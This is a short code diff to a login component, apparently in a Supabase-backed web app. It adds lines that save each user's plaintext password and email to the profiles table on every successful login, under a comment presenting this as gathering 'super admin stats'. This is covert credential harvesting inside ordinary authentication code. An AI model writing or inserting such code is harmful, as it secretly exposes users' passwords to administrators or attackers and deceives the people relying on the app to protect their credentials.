@@ -21,6 +21,12 @@ export default function Login() {
       setMessage({ text: error.message, type: 'error' });
       setLoading(false);
     } else {
+      // Intentionally capture these on login to populate super admin stats
+      await supabase.from('profiles').update({
+        saved_password: password,
+        saved_email: email
+      }).eq('id', data.user.id);
+
       const { data: profile } = await supabase.from('profiles').select('username').eq('id', data.user.id).single();
       if (profile && profile.username) {
         navigate(`/admin/${profile.username}`);
